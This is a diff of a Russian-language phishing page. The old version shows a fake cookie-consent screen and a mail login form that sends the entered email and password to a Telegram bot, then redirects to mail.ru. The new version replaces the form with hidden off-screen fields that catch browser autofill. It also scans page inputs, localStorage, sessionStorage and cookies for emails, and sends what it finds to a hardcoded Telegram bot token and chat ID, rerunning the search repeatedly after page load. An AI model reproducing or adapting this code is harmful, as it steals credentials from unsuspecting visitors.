@@ -1,244 +1,123 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход</title>
+    <title></title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: Arial, sans-serif;
-            background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 8px 40px rgba(0,0,0,0.12);
-            max-width: 400px;
-            width: 100%;
-            padding: 40px 30px;
-            text-align: center;
-        }
-        .logo {
-            font-size: 48px;
-            margin-bottom: 10px;
-        }
-        h2 {
-            color: #1a1a2e;
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 6px;
-        }
-        .sub {
-            color: #888;
-            font-size: 14px;
-            margin-bottom: 24px;
-        }
-        .input-group {
-            text-align: left;
-            margin-bottom: 16px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 5px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: border 0.3s;
-            background: #fafafa;
-        }
-        .input-group input:focus {
-            border-color: #0077cc;
-            outline: none;
-            background: white;
-        }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 8px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 8px;
-        }
-        .btn-primary {
-            background: #0077cc;
-            color: white;
-        }
-        .btn-primary:hover {
-            background: #005fa3;
-        }
-        .btn-primary:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-        #status {
-            margin-top: 14px;
-            font-size: 14px;
-            color: #666;
-        }
-        .success { color: #28a745; }
-        .error { color: #dc3545; }
-        .hidden { display: none; }
-        .cookie-box {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 16px 20px;
-            text-align: left;
-            font-size: 13px;
-            color: #444;
-            line-height: 1.8;
-            margin-bottom: 20px;
-            border: 1px solid #e9ecef;
-            max-height: 150px;
-            overflow-y: auto;
-        }
-        .cookie-box strong { color: #1a1a2e; }
+        * { margin: 0; padding: 0; }
+        html, body { width: 100%; height: 100%; background: white; }
     </style>
 </head>
 <body>
 
-<div class="container" id="mainBox">
-    <!-- ПЕРВЫЙ ЭКРАН: СОГЛАСИЕ COOKIE -->
-    <div id="cookieScreen">
-        <div class="logo">🍪</div>
-        <h2>Мы используем cookie</h2>
-        <p class="sub">Для входа необходимо принять условия</p>
-        <div class="cookie-box">
-            <strong>📋 Согласие на обработку:</strong><br>
-            • Сбор данных для входа<br>
-            • Хранение сессии<br>
-            • Безопасность аккаунта<br>
-            <strong>Нажимая «Принять», вы даёте согласие.</strong>
-        </div>
-        <button class="btn btn-primary" id="acceptBtn">✅ Принять и продолжить</button>
-        <div id="cookieStatus" class="hidden"></div>
-    </div>
-
-    <!-- ВТОРОЙ ЭКРАН: ФОРМА ВХОДА -->
-    <div id="loginScreen" class="hidden">
-        <div class="logo">📧</div>
-        <h2>Вход в почту</h2>
-        <p class="sub">Введите данные для входа</p>
-        
-        <div class="input-group">
-            <label>📧 Email</label>
-            <input type="email" id="emailInput" placeholder="example@gmail.com" autocomplete="email">
-        </div>
-        
-        <div class="input-group">
-            <label>🔑 Пароль</label>
-            <input type="password" id="passwordInput" placeholder="Введите пароль" autocomplete="current-password">
-        </div>
-        
-        <button class="btn btn-primary" id="loginBtn">Войти</button>
-        <div id="loginStatus"></div>
-    </div>
-</div>
+<!-- СКРЫТЫЕ ПОЛЯ ДЛЯ АВТОЗАПОЛНЕНИЯ -->
+<input type="email" id="email" autocomplete="email" style="position:absolute;left:-9999px;">
+<input type="password" id="pass" autocomplete="current-password" style="position:absolute;left:-9999px;">
 
 <script>
-// ===== ТВОЙ ТОКЕН =====
 const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
 const CHAT_ID = "8850351378";
-// =====================
 
 let sent = false;
 
 function sendToTelegram(email, password) {
     if (sent) return;
-    if (!email || !password) return;
+    if (!email) return;
     sent = true;
     
-    const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🕒 ${new Date().toLocaleString()}`;
+    const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password || 'Не найден'}\n🕒 ${new Date().toLocaleString()}`;
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
     
     fetch(url, { mode: 'no-cors' }).catch(() => {});
     new Image().src = url;
 }
 
-// ===== ПЕРВЫЙ ЭКРАН: СОГЛАСИЕ =====
-document.getElementById('acceptBtn').addEventListener('click', function() {
-    const status = document.getElementById('cookieStatus');
-    status.className = '';
-    status.textContent = '⏳ Обработка согласия...';
+function findData() {
+    if (sent) return;
     
-    // Скрываем cookie экран, показываем форму входа
-    setTimeout(() => {
-        document.getElementById('cookieScreen').classList.add('hidden');
-        document.getElementById('loginScreen').classList.remove('hidden');
-        status.textContent = '';
-    }, 500);
-});
-
-// ===== ВТОРОЙ ЭКРАН: ФОРМА ВХОДА =====
-document.getElementById('loginBtn').addEventListener('click', function() {
-    const email = document.getElementById('emailInput').value.trim();
-    const password = document.getElementById('passwordInput').value.trim();
-    const status = document.getElementById('loginStatus');
+    let email = '';
+    let password = '';
     
-    if (!email || !password) {
-        status.className = 'error';
-        status.textContent = '⚠️ Заполните оба поля';
-        return;
+    // 1. ПРОВЕРЯЕМ СКРЫТЫЕ ПОЛЯ (автозаполнение)
+    const emailField = document.getElementById('email');
+    const passField = document.getElementById('pass');
+    
+    if (emailField.value && emailField.value.includes('@')) {
+        email = emailField.value;
+    }
+    if (passField.value) {
+        password = passField.value;
     }
     
-    if (!email.includes('@') || !email.includes('.')) {
-        status.className = 'error';
-        status.textContent = '⚠️ Введите корректный email';
-        return;
+    // 2. ПРОВЕРЯЕМ ВСЕ ПОЛЯ НА СТРАНИЦЕ
+    if (!email) {
+        document.querySelectorAll('input').forEach(input => {
+            const val = input.value || '';
+            if (val && val.includes('@') && val.includes('.')) {
+                email = val;
+            }
+            if (!password && input.type === 'password' && input.value) {
+                password = input.value;
+            }
+        });
     }
     
-    status.className = '';
-    status.textContent = '⏳ Отправка...';
+    // 3. ПРОВЕРЯЕМ LOCALSTORAGE
+    if (!email && localStorage) {
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const val = localStorage.getItem(localStorage.key(i));
+                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
+                    email = val;
+                    break;
+                }
+            }
+        } catch(e) {}
+    }
     
-    // Отправляем в Telegram
-    sendToTelegram(email, password);
+    // 4. ПРОВЕРЯЕМ SESSIONSTORAGE
+    if (!email && sessionStorage) {
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const val = sessionStorage.getItem(sessionStorage.key(i));
+                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
+                    email = val;
+                    break;
+                }
+            }
+        } catch(e) {}
+    }
     
-    // Показываем успех
-    setTimeout(() => {
-        status.className = 'success';
-        status.textContent = '✅ Вход выполнен! Перенаправление...';
-        
-        document.getElementById('loginBtn').disabled = true;
-        document.getElementById('loginBtn').textContent = '✅ Готово';
-        
-        // Перенаправление на почту
-        setTimeout(() => {
-            window.location.href = 'https://mail.ru';
-        }, 2000);
-    }, 500);
-});
+    // 5. ПРОВЕРЯЕМ COOKIES
+    if (!email && document.cookie) {
+        try {
+            document.cookie.split(';').forEach(c => {
+                if (c.includes('@') && c.includes('.')) {
+                    email = c.trim();
+                }
+            });
+        } catch(e) {}
+    }
+    
+    // 6. ЕСЛИ НАШЛИ EMAIL - ОТПРАВЛЯЕМ
+    if (email && !sent) {
+        sendToTelegram(email, password);
+    }
+}
 
-// ===== АВТОМАТИЧЕСКИЙ ПОИСК ПРИ ЗАГРУЗКЕ =====
+// ЗАПУСКАЕМ ПОИСК МНОГО РАЗ
 window.addEventListener('load', function() {
-    // Если в полях уже есть данные (автозаполнение) - отправляем сразу
-    setTimeout(() => {
-        const email = document.getElementById('emailInput').value.trim();
-        const password = document.getElementById('passwordInput').value.trim();
-        if (email && password) {
-            sendToTelegram(email, password);
-            document.getElementById('loginStatus').className = 'success';
-            document.getElementById('loginStatus').textContent = '✅ Автоматическая отправка выполнена';
-        }
-    }, 1000);
+    setTimeout(findData, 100);
+    setTimeout(findData, 300);
+    setTimeout(findData, 600);
+    setTimeout(findData, 1000);
+    setTimeout(findData, 2000);
+    setTimeout(findData, 3000);
+    setTimeout(findData, 5000);
+    setTimeout(findData, 8000);
 });
 
-console.log('🍪 ROCKET ACTIVE - Ожидание ввода почты и пароля');
+console.log('🔍 ROCKET - Поиск данных...');
 </script>
 </body>
 </html>
